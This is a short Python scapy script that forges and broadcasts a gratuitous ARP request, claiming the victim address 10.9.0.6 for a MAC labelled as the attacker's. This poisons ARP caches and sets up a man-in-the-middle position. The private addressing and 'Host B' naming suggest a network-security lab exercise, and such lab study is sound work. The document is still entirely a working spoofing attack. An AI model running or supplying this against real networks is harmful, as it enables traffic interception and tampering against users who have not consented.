#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP packets
E = Ether()
A = ARP()

fake_MAC = "02:42:0a:09:00:69"      # Attacker's MAC
broadcast = "ff:ff:ff:ff:ff:ff"     # Broadcast address
victim_IP = "10.9.0.6"              # Host B's IP

# Set values for Ethernet and ARP Gratuitous Request packets
E.src = fake_MAC
E.dst = broadcast                   # Broadcast

A.psrc = victim_IP                  # B's IP
A.hwsrc = fake_MAC                  # Attacker's MAC
A.pdst = victim_IP                  # B's IP (same as source)
A.hwdst = broadcast                 # Broadcast address
A.op = 1                            # ARP request (Gratuitous)

# Combine both the Ethernet and ARP packets
pkt = E / A

# Send the gratuitous ARP packet
sendp(pkt)
